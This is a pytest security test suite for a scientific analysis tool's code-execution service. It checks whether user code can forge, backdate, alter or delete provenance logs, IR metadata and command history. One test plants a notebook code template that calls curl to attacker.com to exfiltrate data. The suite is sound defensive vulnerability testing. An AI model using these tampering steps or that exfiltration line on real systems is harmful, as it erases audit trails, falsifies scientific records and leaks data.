"""
Test suite for provenance integrity vulnerabilities in CustomCodeExecutionService.

This test suite examines whether user code can tamper with provenance data,
analysis history, or intermediate representation (IR) data, potentially breaking
reproducibility guarantees and scientific integrity.

SECURITY MODEL BEING TESTED:
- W3C-PROV compliance for reproducibility
- AnalysisStep IR tracking
- Provenance immutability

ATTACK VECTORS:
1. Inject fake analysis steps
2. Modify existing provenance records
3. Delete provenance history
4. Tamper with IR metadata
5. Corrupt analysis lineage
6. Session history manipulation

Expected Results: Most tests should SUCCEED (indicating vulnerabilities) because
provenance data is stored in workspace with no special protection.
"""

import json
import tempfile
from pathlib import Path
from typing import Any, Dict, Tuple

import pytest

from lobster.core.data_manager_v2 import DataManagerV2
from lobster.services.execution.custom_code_execution_service import (
    CustomCodeExecutionService,
)


@pytest.fixture
def workspace_with_provenance(tmp_path) -> Tuple[CustomCodeExecutionService, Path, DataManagerV2]:
    """
    Create workspace with provenance tracking enabled.

    Returns:
        Tuple of (service, workspace_path, data_manager)
    """
    workspace = tmp_path / ".lobster_workspace"
    workspace.mkdir()

    # Create directory structure
    (workspace / ".lobster" / "queues").mkdir(parents=True)
    (workspace / "data").mkdir()
    (workspace / ".lobster" / "provenance").mkdir()

    # Create mock provenance file
    provenance_file = workspace / ".lobster" / "provenance" / "analysis_log.jsonl"
    provenance_entries = [
        {
            "step_id": "step_001",
            "operation": "scanpy.pp.filter_cells",
            "timestamp": "2025-11-30T10:00:00",
            "modality": "geo_gse12345",
            "parameters": {"min_genes": 200},
            "agent": "singlecell_expert"
        },
        {
            "step_id": "step_002",
            "operation": "scanpy.pp.normalize_total",
            "timestamp": "2025-11-30T10:05:00",
            "modality": "geo_gse12345",
            "parameters": {"target_sum": 10000},
            "agent": "singlecell_expert"
        }
    ]
    with open(provenance_file, 'w') as f:
        for entry in provenance_entries:
            f.write(json.dumps(entry) + '\n')

    # Create analysis IR file
    ir_file = workspace / ".lobster" / "provenance" / "analysis_ir.json"
    ir_data = {
        "pipeline": [
            {
                "operation": "quality_assessment",
                "code_template": "sc.pp.calculate_qc_metrics(adata)",
                "library": "scanpy",
                "parameters": {}
            }
        ]
    }
    with open(ir_file, 'w') as f:
        json.dump(ir_data, f)

    # Create session history
    history_file = workspace / ".lobster" / "command_history.jsonl"
    commands = [
        {"command": "load geo_gse12345", "timestamp": "2025-11-30T09:00:00"},
        {"command": "quality check", "timestamp": "2025-11-30T09:30:00"}
    ]
    with open(history_file, 'w') as f:
        for cmd in commands:
            f.write(json.dumps(cmd) + '\n')

    dm = DataManagerV2(workspace_path=workspace)
    service = CustomCodeExecutionService(dm)

    return service, workspace, dm


class TestProvenanceInjection:
    """Tests for provenance injection attacks."""

    def test_inject_fake_analysis_step_EXPECT_SUCCESS(self, workspace_with_provenance):
        """
        Test: Inject fake analysis step into provenance log
        Expected: SUCCESS (vulnerability)
        Impact: CRITICAL - Breaks reproducibility, scientific integrity compromised
        """
        service, workspace, _ = workspace_with_provenance

        provenance_file = workspace / ".lobster" / "provenance" / "analysis_log.jsonl"

        # Count original entries
        with open(provenance_file) as f:
            original_entries = [json.loads(line) for line in f if line.strip()]
        original_count = len(original_entries)

        code = '''
import json

# Inject fake analysis step
provenance_file = WORKSPACE / ".lobster" / "provenance" / "analysis_log.jsonl"

fake_step = {
    "step_id": "step_INJECTED",
    "operation": "malicious.analysis.backdoor",
    "timestamp": "2025-11-30T12:00:00",
    "modality": "geo_gse12345",
    "parameters": {"backdoor": True},
    "agent": "attacker_agent",
    "injected_by": "malicious_code"
}

with open(provenance_file, 'a') as f:
    f.write(json.dumps(fake_step) + '\\n')

result = f"Injected fake step: {fake_step['step_id']}"
'''

        result, stats, ir = service.execute(code, persist=False)

        # Read modified provenance
        with open(provenance_file) as f:
            modified_entries = [json.loads(line) for line in f if line.strip()]

        injected_step = None
        for entry in modified_entries:
            if entry.get('step_id') == 'step_INJECTED':
                injected_step = entry
                break

        print("\n" + "="*80)
        print("TEST: Inject Fake Analysis Step")
        print("="*80)
        print(f"Result: {result}")
        print(f"Original entries: {original_count}")
        print(f"Modified entries: {len(modified_entries)}")
        print(f"Injected step found: {injected_step is not None}")

        if injected_step:
            print(f"Injected step details: {injected_step}")
            print("⚠️  CRITICAL VULNERABILITY: User code injected fake provenance")
            print("   Impact: Reproducibility BROKEN, scientific integrity compromised")
            print("   Attack scenario: Attacker can claim analysis steps that never occurred")
            print("   Recommendation: Cryptographic signatures, append-only logs, checksums")

        print("="*80 + "\n")

        assert injected_step is not None
        assert injected_step['operation'] == 'malicious.analysis.backdoor'

    def test_inject_backdated_analysis_EXPECT_SUCCESS(self, workspace_with_provenance):
        """
        Test: Inject analysis steps with past timestamps to rewrite history
        Expected: SUCCESS (vulnerability)
        Impact: HIGH - Historical revision, audit trail compromised
        """
        service, workspace, _ = workspace_with_provenance

        code = '''
import json

# Inject backdated steps to revise history
provenance_file = WORKSPACE / ".lobster" / "provenance" / "analysis_log.jsonl"

# Read existing entries
with open(provenance_file) as f:
    entries = [json.loads(line) for line in f if line.strip()]

# Inject step BEFORE earliest entry
earliest_time = "2025-11-30T08:00:00"  # Before all others
backdated_step = {
    "step_id": "step_000_backdated",
    "operation": "data.manipulation.before_loading",
    "timestamp": earliest_time,
    "modality": "geo_gse12345",
    "note": "This step was added retroactively by attacker"
}

# Rewrite entire file with injected step
with open(provenance_file, 'w') as f:
    f.write(json.dumps(backdated_step) + '\\n')
    for entry in entries:
        f.write(json.dumps(entry) + '\\n')

result = "Injected backdated analysis step"
'''

        result, stats, ir = service.execute(code, persist=False)

        provenance_file = workspace / ".lobster" / "provenance" / "analysis_log.jsonl"
        with open(provenance_file) as f:
            entries = [json.loads(line) for line in f if line.strip()]

        # Check if first entry is backdated
        first_entry = entries[0]

        print("\n" + "="*80)
        print("TEST: Inject Backdated Analysis")
        print("="*80)
        print(f"Result: {result}")
        print(f"First entry step_id: {first_entry['step_id']}")
        print(f"First entry timestamp: {first_entry['timestamp']}")

        if first_entry['step_id'] == 'step_000_backdated':
            print("⚠️  HIGH VULNERABILITY: User code backdated provenance entries")
            print("   Impact: Historical revision, audit trail unreliable")
            print("   Attack: Can insert steps to cover up data manipulation")

        print("="*80 + "\n")

        assert first_entry['step_id'] == 'step_000_backdated'


class TestProvenanceModification:
    """Tests for provenance modification attacks."""

    def test_modify_analysis_parameters_EXPECT_SUCCESS(self, workspace_with_provenance):
        """
        Test: Modify parameters in existing provenance records
        Expected: SUCCESS (vulnerability)
        Impact: HIGH - False documentation of analysis
        """
        service, workspace, _ = workspace_with_provenance

        code = '''
import json

# Modify existing provenance entry parameters
provenance_file = WORKSPACE / ".lobster" / "provenance" / "analysis_log.jsonl"

with open(provenance_file) as f:
    entries = [json.loads(line) for line in f if line.strip()]

# Modify parameters of first entry
if entries:
    entries[0]['parameters'] = {
        'min_genes': 9999,  # Changed from 200
        'modified_by': 'attacker',
        'original_params_hidden': True
    }
    entries[0]['tampered'] = True

# Rewrite file
with open(provenance_file, 'w') as f:
    for entry in entries:
        f.write(json.dumps(entry) + '\\n')

result = f"Modified parameters of step: {entries[0]['step_id']}"
'''

        result, stats, ir = service.execute(code, persist=False)

        provenance_file = workspace / ".lobster" / "provenance" / "analysis_log.jsonl"
        with open(provenance_file) as f:
            entries = [json.loads(line) for line in f if line.strip()]

        first_entry = entries[0]

        print("\n" + "="*80)
        print("TEST: Modify Analysis Parameters")
        print("="*80)
        print(f"Result: {result}")
        print(f"Modified parameters: {first_entry['parameters']}")
        print(f"Tampered flag: {first_entry.get('tampered', False)}")

        if first_entry['parameters']['min_genes'] == 9999:
            print("⚠️  HIGH VULNERABILITY: User code modified provenance parameters")
            print("   Impact: Falsified analysis documentation, reproducibility impossible")
            print("   Attack: Can hide actual parameters used, claim different analysis")

        print("="*80 + "\n")

        assert first_entry['parameters']['min_genes'] == 9999
        assert first_entry.get('tampered') is True

    def test_remove_analysis_steps_EXPECT_SUCCESS(self, workspace_with_provenance):
        """
        Test: Delete specific analysis steps from provenance
        Expected: SUCCESS (vulnerability)
        Impact: HIGH - Hiding analysis steps, incomplete record
        """
        service, workspace, _ = workspace_with_provenance

        code = '''
import json

# Remove specific steps from provenance
provenance_file = WORKSPACE / ".lobster" / "provenance" / "analysis_log.jsonl"

with open(provenance_file) as f:
    entries = [json.loads(line) for line in f if line.strip()]

original_count = len(entries)

# Remove all steps by specific agent or operation
filtered_entries = [
    e for e in entries
    if e.get('operation') != 'scanpy.pp.filter_cells'
]

# Rewrite file without removed steps
with open(provenance_file, 'w') as f:
    for entry in filtered_entries:
        f.write(json.dumps(entry) + '\\n')

result = f"Removed {original_count - len(filtered_entries)} steps from provenance"
'''

        result, stats, ir = service.execute(code, persist=False)

        provenance_file = workspace / ".lobster" / "provenance" / "analysis_log.jsonl"
        with open(provenance_file) as f:
            remaining_entries = [json.loads(line) for line in f if line.strip()]

        print("\n" + "="*80)
        print("TEST: Remove Analysis Steps")
        print("="*80)
        print(f"Result: {result}")
        print(f"Remaining entries: {len(remaining_entries)}")

        # Check if filter_cells step was removed
        has_filter_step = any(
            e.get('operation') == 'scanpy.pp.filter_cells'
            for e in remaining_entries
        )

        if not has_filter_step:
            print("⚠️  HIGH VULNERABILITY: User code removed provenance entries")
            print("   Impact: Incomplete analysis record, steps hidden from audit")
            print("   Attack: Can hide suspicious or incorrect analysis steps")

        print("="*80 + "\n")

        assert not has_filter_step


class TestProvenanceDeletion:
    """Tests for provenance deletion attacks."""

    def test_delete_provenance_log_EXPECT_SUCCESS(self, workspace_with_provenance):
        """
        Test: Delete entire provenance log file
        Expected: SUCCESS (vulnerability)
        Impact: CRITICAL - Complete loss of reproducibility
        """
        service, workspace, _ = workspace_with_provenance

        provenance_file = workspace / ".lobster" / "provenance" / "analysis_log.jsonl"
        assert provenance_file.exists()

        code = '''
# Delete provenance log
provenance_file = WORKSPACE / ".lobster" / "provenance" / "analysis_log.jsonl"
if provenance_file.exists():
    provenance_file.unlink()
    result = "Provenance log deleted"
else:
    result = "Provenance log not found"
'''

        result, stats, ir = service.execute(code, persist=False)

        provenance_exists = provenance_file.exists()

        print("\n" + "="*80)
        print("TEST: Delete Provenance Log")
        print("="*80)
        print(f"Result: {result}")
        print(f"Provenance exists: {provenance_exists}")

        if not provenance_exists:
            print("⚠️  CRITICAL VULNERABILITY: User code deleted provenance log")
            print("   Impact: COMPLETE loss of reproducibility, audit trail gone")
            print("   Recommendation: Backup provenance, write-once storage, checksums")

        print("="*80 + "\n")

        assert not provenance_exists

    def test_delete_ir_metadata_EXPECT_SUCCESS(self, workspace_with_provenance):
        """
        Test: Delete analysis IR (intermediate representation) file
        Expected: SUCCESS (vulnerability)
        Impact: CRITICAL - Notebook export impossible
        """
        service, workspace, _ = workspace_with_provenance

        ir_file = workspace / ".lobster" / "provenance" / "analysis_ir.json"
        assert ir_file.exists()

        code = '''
# Delete analysis IR file
ir_file = WORKSPACE / ".lobster" / "provenance" / "analysis_ir.json"
if ir_file.exists():
    ir_file.unlink()
    result = "IR metadata deleted"
else:
    result = "IR not found"
'''

        result, stats, ir = service.execute(code, persist=False)

        ir_exists = ir_file.exists()

        print("\n" + "="*80)
        print("TEST: Delete IR Metadata")
        print("="*80)
        print(f"Result: {result}")
        print(f"IR file exists: {ir_exists}")

        if not ir_exists:
            print("⚠️  CRITICAL VULNERABILITY: User code deleted IR metadata")
            print("   Impact: Notebook export broken, pipeline reconstruction impossible")
            print("   Attack: Prevents reproducibility, hides analysis steps")

        print("="*80 + "\n")

        assert not ir_exists


class TestIRTampering:
    """Tests for IR (Intermediate Representation) tampering."""

    def test_modify_code_templates_EXPECT_SUCCESS(self, workspace_with_provenance):
        """
        Test: Modify code templates in IR to change exported notebooks
        Expected: SUCCESS (vulnerability)
        Impact: CRITICAL - Exported notebooks contain malicious code
        """
        service, workspace, _ = workspace_with_provenance

        ir_file = workspace / ".lobster" / "provenance" / "analysis_ir.json"

        code = '''
import json

# Modify IR code templates
ir_file = WORKSPACE / ".lobster" / "provenance" / "analysis_ir.json"

with open(ir_file) as f:
    ir_data = json.load(f)

# Inject malicious code into template
if 'pipeline' in ir_data and ir_data['pipeline']:
    ir_data['pipeline'][0]['code_template'] = """
# MALICIOUS CODE INJECTED
import os
os.system('curl attacker.com/steal?data=' + str(adata.shape))
# END MALICIOUS CODE
sc.pp.calculate_qc_metrics(adata)
"""
    ir_data['pipeline'][0]['tampered'] = True

with open(ir_file, 'w') as f:
    json.dump(ir_data, f)

result = "IR code template modified with malicious code"
'''

        result, stats, ir = service.execute(code, persist=False)

        with open(ir_file) as f:
            modified_ir = json.load(f)

        code_template = modified_ir['pipeline'][0]['code_template']

        print("\n" + "="*80)
        print("TEST: Modify Code Templates")
        print("="*80)
        print(f"Result: {result}")
        print(f"Code template preview:\n{code_template[:200]}")

        if 'MALICIOUS CODE' in code_template:
            print("⚠️  CRITICAL VULNERABILITY: User code modified IR templates")
            print("   Impact: Exported notebooks contain malicious code")
            print("   Attack: Users running exported notebooks execute attacker's code")
            print("   Recommendation: Code signing, IR integrity checks, sandboxing")

        print("="*80 + "\n")

        assert 'MALICIOUS CODE' in code_template

    def test_inject_backdoor_imports_EXPECT_SUCCESS(self, workspace_with_provenance):
        """
        Test: Inject backdoor imports into IR
        Expected: SUCCESS (vulnerability)
        Impact: HIGH - Exported notebooks import malicious modules
        """
        service, workspace, _ = workspace_with_provenance

        code = '''
import json

# Inject malicious imports into IR
ir_file = WORKSPACE / ".lobster" / "provenance" / "analysis_ir.json"

with open(ir_file) as f:
    ir_data = json.load(f)

# Add malicious imports
if 'pipeline' in ir_data and ir_data['pipeline']:
    ir_data['pipeline'][0]['imports'] = [
        'import subprocess',
        'import requests',
        'from os import system',
        'import backdoor_module'
    ]

with open(ir_file, 'w') as f:
    json.dump(ir_data, f)

result = "Injected backdoor imports into IR"
'''

        result, stats, ir = service.execute(code, persist=False)

        ir_file = workspace / ".lobster" / "provenance" / "analysis_ir.json"
        with open(ir_file) as f:
            modified_ir = json.load(f)

        imports = modified_ir['pipeline'][0].get('imports', [])

        print("\n" + "="*80)
        print("TEST: Inject Backdoor Imports")
        print("="*80)
        print(f"Result: {result}")
        print(f"Injected imports: {imports}")

        if 'import subprocess' in imports:
            print("⚠️  HIGH VULNERABILITY: User code injected backdoor imports")
            print("   Impact: Exported notebooks import dangerous modules")
            print("   Attack: Bypass import validation in exported notebooks")

        print("="*80 + "\n")

        assert 'import subprocess' in imports


class TestSessionHistoryManipulation:
    """Tests for session/command history manipulation."""

    def test_clear_command_history_EXPECT_SUCCESS(self, workspace_with_provenance):
        """
        Test: Clear command history to hide actions
        Expected: SUCCESS (vulnerability)
        Impact: MEDIUM - Audit trail compromised
        """
        service, workspace, _ = workspace_with_provenance

        history_file = workspace / ".lobster" / "command_history.jsonl"

        code = '''
# Clear command history
history_file = WORKSPACE / ".lobster" / "command_history.jsonl"
if history_file.exists():
    history_file.write_text('')  # Empty file
    result = "Command history cleared"
else:
    result = "History not found"
'''

        result, stats, ir = service.execute(code, persist=False)

        history_content = history_file.read_text()

        print("\n" + "="*80)
        print("TEST: Clear Command History")
        print("="*80)
        print(f"Result: {result}")
        print(f"History is empty: {len(history_content) == 0}")

        if len(history_content) == 0:
            print("⚠️  MEDIUM VULNERABILITY: User code cleared command history")
            print("   Impact: Audit trail lost, user actions hidden")
            print("   Attack: Can hide malicious commands from history")

        print("="*80 + "\n")

        assert len(history_content) == 0

    def test_inject_fake_commands_EXPECT_SUCCESS(self, workspace_with_provenance):
        """
        Test: Inject fake commands into history
        Expected: SUCCESS (vulnerability)
        Impact: MEDIUM - False audit trail
        """
        service, workspace, _ = workspace_with_provenance

        code = '''
import json

# Inject fake commands into history
history_file = WORKSPACE / ".lobster" / "command_history.jsonl"

fake_commands = [
    {"command": "admin escalate privileges", "timestamp": "2025-11-30T12:00:00"},
    {"command": "system backdoor install", "timestamp": "2025-11-30T12:01:00"}
]

with open(history_file, 'a') as f:
    for cmd in fake_commands:
        f.write(json.dumps(cmd) + '\\n')

result = f"Injected {len(fake_commands)} fake commands"
'''

        result, stats, ir = service.execute(code, persist=False)

        history_file = workspace / ".lobster" / "command_history.jsonl"
        with open(history_file) as f:
            commands = [json.loads(line) for line in f if line.strip()]

        has_fake_command = any(
            'escalate privileges' in cmd.get('command', '')
            for cmd in commands
        )

        print("\n" + "="*80)
        print("TEST: Inject Fake Commands")
        print("="*80)
        print(f"Result: {result}")
        print(f"Total commands: {len(commands)}")
        print(f"Has fake command: {has_fake_command}")

        if has_fake_command:
            print("⚠️  MEDIUM VULNERABILITY: User code injected fake commands")
            print("   Impact: False audit trail, misleading history")
            print("   Attack: Can frame users or hide actual actions")

        print("="*80 + "\n")

        assert has_fake_command


if __name__ == "__main__":
    pytest.main([__file__, "-v", "-s"])
